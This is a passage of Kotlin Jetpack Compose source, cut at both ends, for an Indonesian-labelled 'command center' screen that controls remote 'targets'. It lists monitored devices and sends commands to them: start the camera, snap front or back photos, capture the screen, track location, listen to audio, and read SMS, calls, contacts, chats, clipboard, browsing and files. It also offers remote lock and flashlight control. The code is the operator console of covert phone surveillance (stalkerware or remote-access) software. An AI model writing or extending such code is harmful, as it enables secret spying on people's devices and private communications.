                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                    ) {
                        Box(Modifier.size(8.dp).clip(CircleShape).background(ccGreen.copy(alpha = onlineAlpha)))
                        Text("ONLINE", fontSize = 11.sp, color = ccGreen, fontWeight = FontWeight.Bold,
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        Text("│", fontSize = 11.sp, color = ccTextDim,
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        Text("TARGETS: $deviceCount", fontSize = 11.sp, color = ccTextDim,
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        Text("│", fontSize = 11.sp, color = ccTextDim,
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        Text("UPLINK: ✓", fontSize = 11.sp, color = ccCyan,
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                    }
                }
            }

            // ═══════════ LIVE OVERVIEW ═══════════
            if (devices.isNotEmpty()) {
                item { CcSectionHeader("LIVE OVERVIEW", ccCyan) }
                item {
                    Surface(
                        Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
                        color = ccCard,
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
                    ) {
                        Column(Modifier.padding(10.dp)) {
                            // Summary chips: LIVE / ONLINE / OFFLINE
                            val liveCount = devices.count { it.status == "live" }
                            val onlineCount = devices.count { it.status == "online" }
                            val offlineCount = devices.count { it.status != "live" && it.status != "online" }

                            Row(
                                Modifier.fillMaxWidth().padding(bottom = 8.dp),
                                horizontalArrangement = Arrangement.spacedBy(6.dp)
                            ) {
                                // LIVE chip
                                Surface(
                                    modifier = Modifier.weight(1f),
                                    shape = RoundedCornerShape(4.dp),
                                    color = ccGreen.copy(alpha = 0.1f)
                                ) {
                                    Row(
                                        Modifier.padding(horizontal = 8.dp, vertical = 6.dp),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.Center
                                    ) {
                                        Box(Modifier.size(6.dp).clip(CircleShape).background(ccGreen))
                                        Spacer(Modifier.width(4.dp))
                                        Text("$liveCount", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = ccGreen,
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                                        Spacer(Modifier.width(4.dp))
                                        Text("LIVE", fontSize = 9.sp, color = ccGreen.copy(alpha = 0.7f),
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                                    }
                                }
                                // ONLINE chip
                                Surface(
                                    modifier = Modifier.weight(1f),
                                    shape = RoundedCornerShape(4.dp),
                                    color = ccYellow.copy(alpha = 0.1f)
                                ) {
                                    Row(
                                        Modifier.padding(horizontal = 8.dp, vertical = 6.dp),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.Center
                                    ) {
                                        Box(Modifier.size(6.dp).clip(CircleShape).background(ccYellow))
                                        Spacer(Modifier.width(4.dp))
                                        Text("$onlineCount", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = ccYellow,
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                                        Spacer(Modifier.width(4.dp))
                                        Text("ON", fontSize = 9.sp, color = ccYellow.copy(alpha = 0.7f),
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                                    }
                                }
                                // OFFLINE chip
                                Surface(
                                    modifier = Modifier.weight(1f),
                                    shape = RoundedCornerShape(4.dp),
                                    color = ccRed.copy(alpha = 0.1f)
                                ) {
                                    Row(
                                        Modifier.padding(horizontal = 8.dp, vertical = 6.dp),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.Center
                                    ) {
                                        Box(Modifier.size(6.dp).clip(CircleShape).background(ccRed))
                                        Spacer(Modifier.width(4.dp))
                                        Text("$offlineCount", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = ccRed,
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                                        Spacer(Modifier.width(4.dp))
                                        Text("OFF", fontSize = 9.sp, color = ccRed.copy(alpha = 0.7f),
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                                    }
                                }
                            }

                            // Divider
                            Box(Modifier.fillMaxWidth().height(0.5.dp).background(ccBorder))
                            Spacer(Modifier.height(6.dp))

                            // Device rows
                            devices.forEach { dev ->
                                val devStatusColor = when (dev.status) {
                                    "live" -> ccGreen
                                    "online" -> ccYellow
                                    else -> ccRed
                                }
                                val isDevSelected = selectedDevice?.deviceName == dev.deviceName
                                val screenIcon = when {
                                    dev.status == "offline" -> ""
                                    dev.screenOn == true -> "☀️"
                                    dev.screenOn == false -> "🌙"
                                    else -> ""
                                }

                                Surface(
                                    onClick = { selectedDevice = dev; expandedModule = -1 },
                                    shape = RoundedCornerShape(4.dp),
                                    color = if (isDevSelected) ccGreen.copy(alpha = 0.08f) else Color.Transparent,
                                    border = if (isDevSelected) androidx.compose.foundation.BorderStroke(1.dp, ccGreen.copy(alpha = 0.4f)) else null
                                ) {
                                    Row(
                                        Modifier.fillMaxWidth().padding(horizontal = 6.dp, vertical = 5.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        // Status dot
                                        Box(Modifier.size(7.dp).clip(CircleShape).background(
                                            if (dev.status == "live") devStatusColor.copy(alpha = onlineAlpha)
                                            else devStatusColor
                                        ))
                                        Spacer(Modifier.width(8.dp))

                                        // Device name
                                        Text(
                                            dev.deviceName,
                                            fontSize = 11.sp,
                                            fontWeight = if (isDevSelected) FontWeight.Bold else FontWeight.Normal,
                                            color = if (isDevSelected) ccGreen else ccText,
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                            modifier = Modifier.weight(1f),
                                            maxLines = 1
                                        )

                                        // Screen on/off indicator
                                        if (screenIcon.isNotEmpty()) {
                                            Text(screenIcon, fontSize = 10.sp)
                                            Spacer(Modifier.width(4.dp))
                                        }

                                        // Selected badge
                                        if (isDevSelected) {
                                            Surface(
                                                shape = RoundedCornerShape(3.dp),
                                                color = ccGreen.copy(alpha = 0.15f)
                                            ) {
                                                Text("▶ SEL", fontSize = 8.sp, color = ccGreen,
                                                    fontWeight = FontWeight.Bold,
                                                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                                    modifier = Modifier.padding(horizontal = 4.dp, vertical = 1.dp))
                                            }
                                            Spacer(Modifier.width(4.dp))
                                        }

                                        // Active module icons
                                        if (dev.activeModules.isNotEmpty()) {
                                            Row(horizontalArrangement = Arrangement.spacedBy(2.dp)) {
                                                dev.activeModules.take(5).forEach { module ->
                                                    val icon = when (module) {
                                                        "camera" -> "📷"
                                                        "screen" -> "🖥"
                                                        "audio" -> "🎙"
                                                        "location" -> "📍"
                                                        "text" -> "📋"
                                                        else -> "⚙"
                                                    }
                                                    Text(icon, fontSize = 10.sp)
                                                }
                                            }
                                            Spacer(Modifier.width(6.dp))
                                        } else {
                                            Text("—", fontSize = 10.sp, color = ccTextDim,
                                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                                            Spacer(Modifier.width(6.dp))
                                        }

                                        // Time ago
                                        Text(
                                            ccTimeAgo(dev.lastHeartbeatAt),
                                            fontSize = 9.sp, color = ccTextDim,
                                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace
                                        )
                                    }
                                }
                            }

                            // Hint: tap to select device
                            if (selectedDevice == null && devices.isNotEmpty()) {
                                Spacer(Modifier.height(4.dp))
                                Text("↑ Tap device untuk monitoring", fontSize = 9.sp,
                                    color = ccGreen.copy(alpha = 0.5f),
                                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                    modifier = Modifier.fillMaxWidth(),
                                    textAlign = TextAlign.Center)
                            }
                        }
                    }
                }
            }


            // ═══════════ MODULE GRID ═══════════
            if (selectedDevice != null) {
                item { Spacer(Modifier.height(4.dp)); CcSectionHeader("MODULES", ccTextDim) }

                val moduleData = listOf(
                    Triple("📹 KAMERA", ccGreen, state.isCameraActive),
                    Triple("🖥️ LAYAR", ccCyan, state.isScreenActive),
                    Triple("📋 LOG", ccYellow, false),
                    Triple("📍 LOKASI", ccRed, false),
                    Triple("🎙️ AUDIO", ccPurple, false),
                    Triple("🎮 REMOTE", ccOrange, false),
                    Triple("📊 AKTIVITAS", Color(0xFF00BCD4), false),
                    Triple("📸 CAPTURE", Color(0xFFE040FB), false),
                    Triple("🕸️ NETWORK", Color(0xFF00E5FF), false),
                    Triple("⌨️ CLIPBOARD", Color(0xFFFFAB40), false),
                    Triple("📩 SMS", Color(0xFF66BB6A), false),
                    Triple("📞 PANGGILAN", Color(0xFF42A5F5), false),
                    Triple("👤 KONTAK", Color(0xFFAB47BC), false),
                    Triple("💬 CHAT", Color(0xFF26C6DA), false),
                    Triple("📂 FILES", Color(0xFF8D6E63), false)
                )

                // 8 rows × 2 cols
                items(8) { rowIndex ->
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        for (col in 0..1) {
                            val idx = rowIndex * 2 + col
                            if (idx < moduleData.size) {
                                val (label, color, isActive) = moduleData[idx]
                                val isExpanded = expandedModule == idx
                                CcHudCard(
                                    label = label, color = color, isActive = isActive,
                                    isExpanded = isExpanded, modifier = Modifier.weight(1f),
                                    onClick = { expandedModule = if (isExpanded) -1 else idx }
                                )
                            } else {
                                Spacer(Modifier.weight(1f))
                            }
                        }
                    }
                }

                // ═══════════ EXPANDED PANELS ═══════════

                if (expandedModule == 0) {
                    val cam = selectedDevice!!
                    items(1) { CcSectionHeader("CAMERA CONTROL", ccGreen) }
                    item {
                        CcActionRow(ccCard, ccBorder) {
                            CcButton("▶ START", ccGreen, isActive = state.isCameraActive) {
                                viewModel.sendCameraCommand(cam.deviceName, "START", "BACK")
                                viewModel.setCameraActive(true)
                            }
                            CcButton("⏹ STOP", ccRed) {
                                viewModel.sendCameraCommand(cam.deviceName, "STOP")
                                viewModel.setCameraActive(false)
                            }
                            CcButton("🔄 SWITCH", ccCyan) {
                                viewModel.sendCameraCommand(cam.deviceName, "SWITCH")
                            }
                        }
                    }
                    item {
                        CcActionRow(ccCard, ccBorder) {
                            CcButton("👁 VIEW STREAM", ccGreen) {
                                // Smart: try direct if local_ip available, always provide relay fallback
                                val relay = "$relayBaseUrl/camera/frame/${cam.deviceName}"
                                monitorRelayUrl = relay
                                monitorUrl = if (!cam.localIp.isNullOrBlank()) {
                                    "http://${cam.localIp}:${cam.port ?: 8080}"
                                } else {
                                    relay
                                }
                                monitorPeerName = cam.deviceName
                                showMonitor = true
                            }
                        }
                    }
                    item {
                        CcActionRow(ccCard, ccBorder) {
                            CcButton("📸 Foto Depan", Color(0xFF6C5CE7)) {
                                viewModel.sendCameraCommand(cam.deviceName, "TAKE_PHOTO", "FRONT")
                                snapshotUrl = "$relayBaseUrl/camera/frame/${cam.deviceName}?type=snapshot"
                                snapshotDeviceName = cam.deviceName
                                snapshotLens = "Depan"
                                showSnapshotDialog = true
                            }
                            CcButton("📸 Foto Belakang", Color(0xFF00B894)) {
                                viewModel.sendCameraCommand(cam.deviceName, "TAKE_PHOTO", "BACK")
                                snapshotUrl = "$relayBaseUrl/camera/frame/${cam.deviceName}?type=snapshot"
                                snapshotDeviceName = cam.deviceName
                                snapshotLens = "Belakang"
                                showSnapshotDialog = true
                            }
                        }
                    }
                }

                if (expandedModule == 1) {
                    val cam = selectedDevice!!
                    items(1) { CcSectionHeader("SCREEN CAPTURE", ccCyan) }
                    item {
                        CcActionRow(ccCard, ccBorder) {
                            CcButton("▶ Nyalakan", ccCyan, isActive = state.isScreenActive) {
                                viewModel.sendCameraCommand(cam.deviceName, "SCREEN_START")
                                viewModel.setScreenActive(true)
                            }
                            CcButton("⏹ Matikan", ccRed) {
                                viewModel.sendCameraCommand(cam.deviceName, "SCREEN_STOP")
                                viewModel.setScreenActive(false)
                            }
                        }
                    }
                    item {
                        CcActionRow(ccCard, ccBorder) {
                            CcButton("👁 VIEW SCREEN", ccCyan) {
                                monitorUrl = "$relayBaseUrl/camera/frame/${cam.deviceName}?type=screen"
                                monitorRelayUrl = monitorUrl
                                monitorPeerName = "${cam.deviceName} (Layar)"
                                showMonitor = true
                            }
                        }
                    }
                }

                if (expandedModule == 2) { item { ActivityLogPanel(selectedDevice!!.deviceName, viewModel, relayBaseUrl) } }
                if (expandedModule == 3) { item { LocationTrackingPanel(selectedDevice!!.deviceName, viewModel, relayBaseUrl) } }
                if (expandedModule == 4) { item { AudioMonitorPanel(selectedDevice!!.deviceName, viewModel, relayBaseUrl) } }

                if (expandedModule == 5) {
                    val cam = selectedDevice!!
                    items(1) { CcSectionHeader("REMOTE CONTROL", ccOrange) }
                    item { RemoteControlPanel(cam.deviceName, viewModel, relayBaseUrl, ccCard, ccBorder, ccOrange, ccGreen, ccRed, ccCyan, ccText, ccTextDim) }
                }

                if (expandedModule == 6) {
                    item { DeviceActivityPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFF00BCD4), ccText, ccTextDim) }
                }

                // Module 7: CAPTURE — Screenshot Gallery
                if (expandedModule == 7) {
                    item { ScreenshotGalleryPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFFE040FB), ccText, ccTextDim) }
                }

                // Module 8: NETWORK — URL visits + data usage
                if (expandedModule == 8) {
                    item { NetworkMonitorPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFF00E5FF), ccText, ccTextDim) }
                }

                // Module 9: CLIPBOARD — Copy/paste log
                if (expandedModule == 9) {
                    item { ClipboardMonitorPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFFFFAB40), ccText, ccTextDim) }
                }

                // Module 10: SMS
                if (expandedModule == 10) {
                    item { SmsMonitorPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFF66BB6A), ccText, ccTextDim) }
                }

                // Module 11: CALLS
                if (expandedModule == 11) {
                    item { CallLogPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFF42A5F5), ccText, ccTextDim) }
                }

                // Module 12: CONTACTS
                if (expandedModule == 12) {
                    item { ContactsPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFFAB47BC), ccText, ccTextDim) }
                }

                // Module 13: IM / CHAT (from existing activity logs)
                if (expandedModule == 13) {
                    item { ImTrackingPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFF26C6DA), ccText, ccTextDim) }
                }

                // Module 14: FILE MANAGER
                if (expandedModule == 14) {
                    item { FileManagerPanel(selectedDevice!!.deviceName, ccCard, ccBorder, Color(0xFF8D6E63), ccText, ccTextDim) }
                }
            }

            // ═══════════ TERMINAL LOG FEED ═══════════
            item { Spacer(Modifier.height(8.dp)); CcSectionHeader("SYSTEM LOG", ccTextDim) }
            item {
                Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
                    color = Color(0xFF080C14),
                    border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                    Column(Modifier.padding(10.dp)) {
                        val logs = state.logs.take(8)
                        if (logs.isEmpty()) {
                            Text("$ awaiting input...", fontSize = 11.sp,
                                color = ccGreen.copy(alpha = 0.4f),
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        } else {
                            logs.forEach { log ->
                                Text("> $log", fontSize = 10.sp,
                                    color = ccGreen.copy(alpha = 0.7f),
                                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                    maxLines = 1, modifier = Modifier.padding(vertical = 1.dp))
                            }
                        }
                    }
                }
            }
        }
    }
}


// ─── Command Center Helper Composables ─────────────────

/**
 * Parse ISO time string and return relative time (e.g. "just now", "2m ago", "1h ago").
 */
private fun ccTimeAgo(isoTime: String?): String {
    if (isoTime.isNullOrBlank()) return "—"
    return try {
        val formats = listOf(
            java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSS'Z'", java.util.Locale.US),
            java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US),
            java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
        )
        formats.forEach { it.timeZone = java.util.TimeZone.getTimeZone("UTC") }

        var parsed: java.util.Date? = null
        for (fmt in formats) {
            try { parsed = fmt.parse(isoTime); break } catch (_: Exception) {}
        }
        if (parsed == null) return "—"

        val diffMs = System.currentTimeMillis() - parsed.time
        val diffSec = diffMs / 1000
        val diffMin = diffSec / 60
        val diffHour = diffMin / 60
        val diffDay = diffHour / 24

        when {
            diffSec < 30 -> "just now"
            diffSec < 60 -> "${diffSec}s ago"
            diffMin < 60 -> "${diffMin}m ago"
            diffHour < 24 -> "${diffHour}h ago"
            else -> "${diffDay}d ago"
        }
    } catch (_: Exception) { "—" }
}

@Composable
private fun CcSectionHeader(title: String, color: Color, modifier: Modifier = Modifier) {
    Text(
        "// $title", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = color,
        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
        modifier = modifier.padding(vertical = 4.dp)
    )
}

@Composable
private fun CcActionRow(bgColor: Color, borderColor: Color, content: @Composable RowScope.() -> Unit) {
    Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), color = bgColor,
        border = androidx.compose.foundation.BorderStroke(0.5.dp, borderColor)) {
        Row(Modifier.padding(8.dp), horizontalArrangement = Arrangement.spacedBy(6.dp), content = content)
    }
}

@Composable
private fun RowScope.CcButton(label: String, color: Color, isActive: Boolean = false, onClick: () -> Unit) {
    val pulseAlpha = if (isActive) {
        val inf = rememberInfiniteTransition(label = "pulse")
        inf.animateFloat(initialValue = 0.3f, targetValue = 0.6f,
            animationSpec = infiniteRepeatable(tween(800, easing = FastOutSlowInEasing), RepeatMode.Reverse),
            label = "pa").value
    } else 0.12f

    Surface(
        onClick = onClick, modifier = Modifier.weight(1f), shape = RoundedCornerShape(6.dp),
        color = color.copy(alpha = pulseAlpha),
        border = androidx.compose.foundation.BorderStroke(
            if (isActive) 1.5.dp else 0.5.dp, color.copy(alpha = if (isActive) 0.8f else 0.3f))
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Text(label, modifier = Modifier.padding(top = 10.dp, bottom = if (isActive) 2.dp else 10.dp),
                textAlign = TextAlign.Center, fontSize = 12.sp, fontWeight = FontWeight.Bold,
                color = if (isActive) Color.White else color,
                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
            if (isActive) {
                Text("● AKTIF", modifier = Modifier.padding(bottom = 6.dp),
                    textAlign = TextAlign.Center, fontSize = 9.sp, fontWeight = FontWeight.Bold, color = color,
                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
            }
        }
    }
}

/** HUD-style module card with corner accent lines. */
@Composable
private fun CcHudCard(
    label: String, color: Color, isActive: Boolean, isExpanded: Boolean,
    modifier: Modifier = Modifier, onClick: () -> Unit
) {
    val borderAlpha by animateFloatAsState(
        targetValue = if (isExpanded) 0.8f else if (isActive) 0.5f else 0.15f,
        animationSpec = tween(300), label = "ba"
    )
    val bgAlpha by animateFloatAsState(
        targetValue = if (isExpanded) 0.12f else 0.04f,
        animationSpec = tween(300), label = "bga"
    )

    Surface(
        onClick = onClick, modifier = modifier.height(80.dp), shape = RoundedCornerShape(8.dp),
        color = color.copy(alpha = bgAlpha),
        border = androidx.compose.foundation.BorderStroke(
            if (isExpanded) 1.5.dp else 0.5.dp, color.copy(alpha = borderAlpha))
    ) {
        Box(Modifier.fillMaxSize()) {
            CcCornerAccents(color.copy(alpha = borderAlpha))
            Column(
                Modifier.fillMaxSize().padding(12.dp),
                verticalArrangement = Arrangement.Center,
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(label, fontSize = 14.sp, fontWeight = FontWeight.Bold, color = color,
                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                    textAlign = TextAlign.Center)
                if (isActive) {
                    Spacer(Modifier.height(4.dp))
                    val pulse = rememberInfiniteTransition(label = "cp")
                    val dotAlpha by pulse.animateFloat(
                        initialValue = 0.4f, targetValue = 1f,
                        animationSpec = infiniteRepeatable(tween(800), RepeatMode.Reverse), label = "da"
                    )
                    Text("● AKTIF", fontSize = 9.sp, fontWeight = FontWeight.Bold,
                        color = color.copy(alpha = dotAlpha),
                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                }
            }
            if (isExpanded) {
                Box(Modifier.fillMaxWidth().height(2.dp).align(Alignment.BottomCenter)
                    .background(Brush.horizontalGradient(listOf(color, Color.Transparent))))
            }
        }
    }
}

/** Corner accent lines — L-shaped at 4 corners (sci-fi HUD targeting). */
@Composable
private fun CcCornerAccents(color: Color) {
    val len = 14.dp; val t = 1.5.dp
    Box(Modifier.fillMaxSize()) {
        Box(Modifier.align(Alignment.TopStart).padding(4.dp)) {
            Box(Modifier.width(len).height(t).background(color))
            Box(Modifier.width(t).height(len).background(color))
        }
        Box(Modifier.align(Alignment.TopEnd).padding(4.dp)) {
            Box(Modifier.width(len).height(t).align(Alignment.TopEnd).background(color))
            Box(Modifier.width(t).height(len).align(Alignment.TopEnd).background(color))
        }
        Box(Modifier.align(Alignment.BottomStart).padding(4.dp)) {
            Box(Modifier.width(len).height(t).align(Alignment.BottomStart).background(color))
            Box(Modifier.width(t).height(len).align(Alignment.BottomStart).background(color))
        }
        Box(Modifier.align(Alignment.BottomEnd).padding(4.dp)) {
            Box(Modifier.width(len).height(t).align(Alignment.BottomEnd).background(color))
            Box(Modifier.width(t).height(len).align(Alignment.BottomEnd).background(color))
        }
    }
}


/**
 * Remote Control Panel — Lock, Ring, Device Info, App List
 */
@Composable
private fun RemoteControlPanel(
    deviceName: String,
    viewModel: NearbyViewModel,
    relayBaseUrl: String,
    ccCard: Color, ccBorder: Color, ccOrange: Color, ccGreen: Color,
    ccRed: Color, ccCyan: Color, ccText: Color, ccTextDim: Color
) {
    val context = androidx.compose.ui.platform.LocalContext.current

    var deviceInfo by remember { mutableStateOf<com.example.kabensatudata.data.remote.dto.DeviceInfoEntry?>(null) }
    var appList by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.InstalledAppItem>>(emptyList()) }
    var showApps by remember { mutableStateOf(false) }
    var isLoadingInfo by remember { mutableStateOf(false) }
    var isLoadingApps by remember { mutableStateOf(false) }

    val apiService = remember {
        dagger.hilt.android.EntryPointAccessors.fromApplication(
            context.applicationContext,
            com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
        ).apiService()
    }

    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        // ── Action Buttons ──
        Surface(Modifier.fillMaxWidth(), color = ccCard, shape = RoundedCornerShape(8.dp),
            border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
            Column(Modifier.padding(10.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                // Row 1: Lock + Ring
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Surface(
                        onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_LOCK") },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccRed.copy(alpha = 0.12f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccRed.copy(alpha = 0.3f))
                    ) {
                        Column(Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("🔒", fontSize = 20.sp)
                            Spacer(Modifier.height(4.dp))
                            Text("LOCK", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccRed,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                    Surface(
                        onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_RING") },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccOrange.copy(alpha = 0.12f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccOrange.copy(alpha = 0.3f))
                    ) {
                        Column(Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("🔔", fontSize = 20.sp)
                            Spacer(Modifier.height(4.dp))
                            Text("RING", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccOrange,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                }

                // Row 2: Stop Ring
                Surface(
                    onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_STOP_RING") },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(6.dp),
                    color = ccTextDim.copy(alpha = 0.08f),
                    border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
                ) {
                    Text("⏹ STOP RING", modifier = Modifier.padding(10.dp),
                        textAlign = TextAlign.Center, fontSize = 11.sp, fontWeight = FontWeight.Bold,
                        color = ccTextDim, fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                }

                // ─── Row 3: Flash / Senter Control ───────────────────────
                Text(
                    "🔦  SENTER REMOTE",
                    fontSize = 10.sp,
                    fontWeight = FontWeight.Bold,
                    color = ccTextDim,
                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                    modifier = Modifier.padding(top = 4.dp, bottom = 2.dp)
                )
                // ON + OFF
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Surface(
                        onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_FLASH_ON") },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = Color(0xFFFFD600).copy(alpha = 0.12f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, Color(0xFFFFD600).copy(alpha = 0.4f))
                    ) {
                        Column(Modifier.padding(10.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("🔦", fontSize = 18.sp)
                            Spacer(Modifier.height(2.dp))
                            Text("ON", fontSize = 11.sp, fontWeight = FontWeight.Bold,
                                color = Color(0xFFFFD600),
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                    Surface(
                        onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_FLASH_OFF") },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccTextDim.copy(alpha = 0.08f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
                    ) {
                        Column(Modifier.padding(10.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("🌑", fontSize = 18.sp)
                            Spacer(Modifier.height(2.dp))
                            Text("OFF", fontSize = 11.sp, fontWeight = FontWeight.Bold,
                                color = ccTextDim,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                }
                // BLINK + SOS + PULSE
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Surface(
                        onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_FLASH_BLINK") },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccCyan.copy(alpha = 0.10f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccCyan.copy(alpha = 0.3f))
                    ) {
                        Column(Modifier.padding(8.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("💡", fontSize = 16.sp)
                            Spacer(Modifier.height(2.dp))
                            Text("BLINK", fontSize = 10.sp, fontWeight = FontWeight.Bold,
                                color = ccCyan,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                    Surface(
                        onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_FLASH_SOS") },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccRed.copy(alpha = 0.12f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccRed.copy(alpha = 0.4f))
                    ) {
                        Column(Modifier.padding(8.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("🆘", fontSize = 16.sp)
                            Spacer(Modifier.height(2.dp))
                            Text("SOS", fontSize = 10.sp, fontWeight = FontWeight.Bold,
                                color = ccRed,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                    Surface(
                        onClick = { viewModel.sendCameraCommand(deviceName, "REMOTE_FLASH_PULSE") },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccGreen.copy(alpha = 0.10f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccGreen.copy(alpha = 0.3f))
                    ) {
                        Column(Modifier.padding(8.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("🔆", fontSize = 16.sp)
                            Spacer(Modifier.height(2.dp))
                            Text("PULSE", fontSize = 10.sp, fontWeight = FontWeight.Bold,
                                color = ccGreen,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                }

                // Row 4: Device Info + App List
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Surface(
                        onClick = {
                            viewModel.sendCameraCommand(deviceName, "REMOTE_DEVICE_INFO")
                            isLoadingInfo = true
                            kotlinx.coroutines.MainScope().launch {
                                kotlinx.coroutines.delay(3000)
                                try {
                                    val resp = withContext(Dispatchers.IO) { apiService.getDeviceInfo(deviceName) }
                                    if (resp.isSuccessful) deviceInfo = resp.body()
                                } catch (_: Exception) { }
                                isLoadingInfo = false
                            }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccCyan.copy(alpha = 0.12f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccCyan.copy(alpha = 0.3f))
                    ) {
                        Column(Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("📱", fontSize = 20.sp)
                            Spacer(Modifier.height(4.dp))
